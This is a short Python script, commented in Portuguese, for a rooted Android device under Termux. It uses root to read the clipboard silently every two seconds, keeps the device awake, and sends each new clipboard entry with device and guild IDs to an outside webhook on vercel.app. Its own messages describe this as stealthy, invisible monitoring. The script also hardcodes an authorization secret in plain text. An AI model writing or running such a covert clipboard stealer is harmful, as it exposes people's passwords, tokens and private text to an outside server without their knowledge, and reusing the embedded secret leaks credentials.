import sys
import time
import subprocess
import requests

if len(sys.argv) < 3:
    print("❌ Faltando IDs no comando!")
    sys.exit(1)

device_id = sys.argv[1]
guild_id = sys.argv[2]
URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
headers = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}

print("🔓 Preparando leitura super furtiva (Modo Diagnóstico)...")

# Evita que o Termux durma
subprocess.run("termux-wake-lock", shell=True, check=False)

def get_clipboard_invisivel():
    """Usa o Root puro para ler o teclado sem abrir nenhum app e captura erros reais"""
    try:
        # Executa o comando e captura a saída padrão (stdout) e os erros (stderr)
        resultado = subprocess.run(
            ['su', '-c', 'cmd clipboard get-text'], 
            capture_output=True, 
            text=True
        )
        
        # Se o sistema Android recusar ou der erro no Magisk, avisa na tela
        if resultado.returncode != 0:
            print(f"⚠️ Erro no Root/Android: {resultado.stderr.strip()}")
            return ""
            
        output = resultado.stdout.strip()
        
        # Limpa vazios e retornos nulos
        if output == "null" or output == "":
            return ""
            
        return output
    except Exception as e:
        print(f"❌ Erro interno do Python: {e}")
        return ""

last_clip = get_clipboard_invisivel()

print("📋 Monitor Invisível Iniciado!")
print("⏳ Tente copiar algo no Google. Se o Android bloquear, o erro aparecerá aqui.")

while True:
    try:
        current = get_clipboard_invisivel()
        
        if current and current != last_clip:
            print(f"\n📝 NOVO TEXTO: '{current}'")
            try:
                requests.post(
                    URL_WEBHOOK, 
                    json={"texto": current, "device_id": device_id, "guild_id": guild_id}, 
                    headers=headers, 
                    timeout=5
                )
                print("✅ Enviado com sucesso!")
                last_clip = current
                
                # Salva o ping de vida
                try:
                    with open("last_activity.txt", "w") as f:
                        f.write(str(time.time()))
                except:
                    pass
            except Exception as e:
                print(f"❌ Erro de internet: {e}")
                
    except Exception as e:
        pass
        
    time.sleep(2)
